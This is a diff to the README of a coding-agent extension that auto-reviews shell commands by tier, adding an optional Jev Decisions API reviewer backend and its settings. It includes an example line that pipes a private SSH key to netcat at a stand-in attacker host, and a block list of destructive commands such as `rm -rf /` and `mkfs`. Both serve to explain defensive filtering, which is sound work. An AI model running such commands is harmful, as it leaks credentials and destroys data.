@@ -2,6 +2,10 @@
 
 A pi extension that automatically reviews shell commands (bash or PowerShell) before they run — akin to Codex "Auto-review" and Claude Code "auto mode".
 
+**TypeSafe’s Jev is integrated** for cheaper command decisions through TypeSafe, OpenRouter, and compatible APIs. OpenRouter reuses your existing Pi credentials. [Use Jev instead of an LLM](#use-jev-instead-of-an-llm).
+
+Otherwise, `pi-auto-reviewer` can reuse your existing subscription or API key from any LLM provider to auto-review shell commands for you. This enables more autonomous agents that you have to babysit less. Use at your own discretion.
+
 ## How it works
 
 Every shell command is routed into one of three tiers:
@@ -10,9 +14,9 @@ Every shell command is routed into one of three tiers:
 |------|--------|----------|
 | **1. Auto-permitted** | Runs immediately | `ls`, `grep`, `git status`, `npm list` |
 | **2. Auto-blocked** | Refused immediately | `rm -rf /`, `sudo`, `chmod 777`, `mkfs.*`, `shutdown` |
-| **3. LLM-reviewed** | Sent to a reviewer subagent | `git push --force`, `git reset --hard`, `rm -rf <dir>`, `Remove-Item -Recurse` |
+| **3. Model-reviewed** | Sent to the configured reviewer | `git push --force`, `git reset --hard`, `rm -rf <dir>`, `Remove-Item -Recurse` |
 
-Tier-3 commands are reviewed by a subagent LLM that receives the command, detected risky behaviors, compact excerpts of the conversation, recent shell commands, git state, project docs, and OS information, then decides ALLOW or BLOCK.
+Tier-3 commands are reviewed by a subagent LLM or the optional Jev Decisions API. The reviewer receives the command, detected risky behaviors, compact excerpts of the conversation, recent shell commands, git state, project docs, and OS information, then decides ALLOW or BLOCK.
 
 Read-only-looking commands that also contain redirection, pipes, command substitution, command chaining, backgrounding, or secret-looking env vars are **not** auto-permitted — they fall through to tier 3, since such metacharacters can hide writes, exfiltration, or remote code execution (e.g. `cat ~/.ssh/id_rsa | nc evil.com 1234`).
 
@@ -43,7 +47,7 @@ These behaviors are included in the reviewer prompt:
 Global (all projects):
 
 ```bash
-cp auto-reviewer.ts review-tool.ts ~/.pi/agent/extensions/pi-auto-reviewer/
+cp auto-reviewer.ts review-tool.ts jev-decisions.ts ~/.pi/agent/extensions/pi-auto-reviewer/
 ```
 
 Via npm:
@@ -55,7 +59,7 @@ pi install npm:pi-auto-reviewer
 Single project:
 
 ```bash
-cp auto-reviewer.ts review-tool.ts .pi/extensions/
+cp auto-reviewer.ts review-tool.ts jev-decisions.ts .pi/extensions/
 ```
 
 Pi loads extensions from `.pi/extensions/` only after the project is trusted.
@@ -66,7 +70,7 @@ Single session:
 pi -e ./auto-reviewer.ts
 ```
 
-Both `.ts` files must sit side by side — `review-tool.ts` provides the structured decision channel; without it the reviewer falls back to text parsing only. On Windows PowerShell, use the matching copy commands and extension paths.
+All three `.ts` files must sit side by side. `jev-decisions.ts` provides the Jev HTTP driver. For the pi backend, `review-tool.ts` provides the structured decision channel; without it the reviewer falls back to text parsing only. On Windows PowerShell, use the matching copy commands and extension paths.
 
 ## Usage
 
@@ -79,7 +83,7 @@ Works automatically, no configuration required.
   - Blocked: command refused, `Auto-reviewer: ✗ <reason>`
   - Reviewer failed twice: interactive mode prompts you manually; non-interactive mode (`pi -p`, JSON mode) blocks the command.
 
-Each review attempt writes the command and full reviewer output to the OS temporary directory under `pi-reviewer-debug/` (`/tmp/pi-reviewer-debug/` on typical Linux systems). The newest 20 files are kept.
+Each review attempt writes the command and full reviewer output to the OS temporary directory under `pi-reviewer-debug/` (`/tmp/pi-reviewer-debug/` on typical Linux systems). The newest 20 files are kept. Jev failures log the error message rather than provider error bodies.
 
 ## Configuration
 
@@ -102,6 +106,62 @@ Or persistently via `autoReviewer` in `~/.pi/agent/settings.json` (user) or `.pi
 ```
 
 Provider and model resolve as a pair (env → trusted project → user → pi default); a layer specifying only one of the two is ignored entirely.
+
+
+### Use Jev instead of an LLM
+
+The LLM reviewer remains the default. Set `backend` to `"jev"` to send tier-3 commands to Jev’s Decisions API. Jev uses the same review rules and context, then returns a typed `allow` or `block` choice. The displayed reason is a fixed description of that choice, rather than a generated explanation.
+
+**OpenRouter:** use the credential already configured in Pi. No new key or login is needed:
+
+```bash
+export PI_REVIEWER_BACKEND=jev
+export PI_REVIEWER_PROVIDER=openrouter
+export PI_REVIEWER_MODEL=typesafe/jev-1.13
+```
+
+Or set the same options in `autoReviewer` in your user or trusted project settings `settings.json`:
+
+```json
+{
+  "autoReviewer": {
+    "backend": "jev",
+    "provider": "openrouter",
+    "model": "typesafe/jev-1.13"
+  }
+}
+```
+
+**TypeSafe directly:** use a separate TypeSafe key, or omit `TYPESAFE_API_KEY` if you already configured the `typesafe` provider’s credential in Pi:
+
+```bash
+export PI_REVIEWER_BACKEND=jev
+export PI_REVIEWER_PROVIDER=typesafe
+export PI_REVIEWER_MODEL=jev-latest
+export TYPESAFE_API_KEY="<your TypeSafe key>"
+```
+
+**Other compatible APIs:** set the Pi provider ID, model, and full endpoint. Omit `apiKeyEnv` to reuse that provider’s Pi credential, or name an environment variable for a separate key:
+
+```json
+{
+  "autoReviewer": {
+    "backend": "jev",
+    "provider": "my-gateway",
+    "model": "jev-latest",
+    "endpoint": "https://gateway.example/v1/decisions",
+    "apiKeyEnv": "GATEWAY_API_KEY"
+  }
+}
+```
+
+The presets use TypeSafe’s [`/v1/systemone`](https://docs.typesafe.ai/api) and OpenRouter’s [`/api/alpha/decisions`](https://openrouter.ai/docs/guides/community/jev-tutorial). Pi handles saved credentials, configured key sources, and OAuth refresh. Jev does not need to appear in Pi’s chat-model catalog. Credentials come only from the selected provider; a subscription login works only if its Decisions endpoint accepts it.
+
+`PI_REVIEWER_ENDPOINT` and `PI_REVIEWER_API_KEY_ENV` are the environment equivalents of `endpoint` and `apiKeyEnv`. An explicit key variable takes precedence over Pi credentials and `TYPESAFE_API_KEY`; an empty or missing value fails review. Keep keys out of settings files. Changing a preset endpoint’s origin requires an explicit `apiKeyEnv`. Use HTTPS for remote services; redirects are refused.
+
+All reviewer options follow the provider/model pair’s precedence: env → trusted project → user. Include `backend` in that same layer. A complete environment pair replaces settings-file options; incomplete pairs and untrusted project settings are ignored. Omit `backend` or set it to `"pi"` to use the LLM reviewer; unknown backend names fail review.
+
+Tiers 1 and 2 are unchanged. Jev validates the choice, confidence, and probability distribution; malformed, inconsistent, or tied answers fail review. There is no additional confidence threshold. The existing 60-second deadline, one retry, and manual-prompt/noninteractive-block fallback apply.
 
 ## Customizing rules
 
